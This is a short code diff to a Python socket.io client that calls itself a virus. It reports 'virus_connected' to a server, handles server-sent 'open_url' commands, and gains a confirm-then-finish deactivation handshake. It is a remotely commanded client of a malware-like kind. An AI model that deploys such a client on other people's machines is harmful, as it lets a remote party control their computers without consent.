@@ -5,6 +5,10 @@ import eventlet
 
 sio = socketio.Client()
 
+@sio.on('connect')
+def connect():
+    sio.emit('virus_connected')
+
 @sio.on('open_url')
 def open_url(data):
     url = data['url']
@@ -15,6 +19,14 @@ def open_url(data):
 @sio.on('deactivate')
 def deactivate():
     print('DEACTIVATING')
+    sio.emit('confirm_deactivate')
+    '''eventlet.sleep(0.5)
+    sio.disconnect()
+    eventlet.sleep(0.5)
+    sys.exit(0)'''
+
+@sio.on('finish_deactivating')
+def finish():
     eventlet.sleep(0.5)
     sio.disconnect()
     eventlet.sleep(0.5)
